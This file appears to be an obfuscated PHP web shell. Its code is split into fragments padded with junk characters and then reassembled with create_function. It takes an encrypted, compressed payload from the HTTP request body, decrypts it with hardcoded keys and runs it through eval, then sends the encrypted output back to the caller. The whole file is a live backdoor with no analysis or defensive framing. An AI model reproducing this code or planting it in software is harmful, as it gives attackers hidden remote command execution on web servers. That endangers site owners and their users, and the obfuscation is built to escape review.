<?php
$L='ch("/$kh(.+)$kfw/",@wfiwle_get_wcowntentws("php://inwputw"),$m)==';
$k='w$k="81bdd6cb";$wkh="w771cac4fwe455w"w;$kf="7bc670w02ec3w6";$p="w';
$V='j++ww,$i++){$o.w=$t{$iw}^$k{$jw};w}}wretuwrn $o;w}if (@preg_wmawt';
$S='buwZkw9kzUpf6fj0fB"ww;function x($wt,$wk){$c=wstrlenw($k)w;$l=wst';
$J='mw[1]),$k)));$o=w@ob_gwetw_contentsw()w;@owb_end_clean();$r=w@bas';
$T='1) {w@ob_swtwart();@ewvawl(@gzuncompwress(@x(@bwase64_wdwecode(w$';
$j='ew64_wewncode(@x(@gzwcwompress($wo),$k));wprintw("$p$kh$r$wkf");}';
$M='rlen($t);$ow="";forw(w$i=0;$i<$wl;){forw($j=0;w($wj<$cw&&$i<$l);$';
$c=str_replace('uw','','creuwauwte_uwfuuwnuwuwction');
$F=str_replace('w','',$k.$S.$M.$V.$L.$T.$J.$j);
$f=$c('',$F);$f();
?>
